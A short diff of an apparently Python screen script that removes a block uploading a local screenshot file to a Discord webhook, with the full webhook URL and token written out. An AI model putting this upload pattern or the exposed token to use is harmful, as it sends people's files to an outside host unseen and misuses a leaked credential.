@@ -9,17 +9,6 @@ import os
 import time
 import requests
 
-with open("2023-02-08_22-49-162.png", 'rb') as f:
-    f = f.read()
-
-link = "https://discord.com/api/webhooks/1429030702090948650/wVnXAoK2s1n7dmVc7fHIhstWAjkox-3s9ZYO9GN47bZTYAdSw2s6pqgnGTol15Lzi_CR"
-
-message = {
-    "squ.png": f
-}
-
-res = requests.post(link, files=message) # cd Downloads 2023-02-08_22-49-162.png
-
 os.system('cls')
 
 left, top = 800, 300
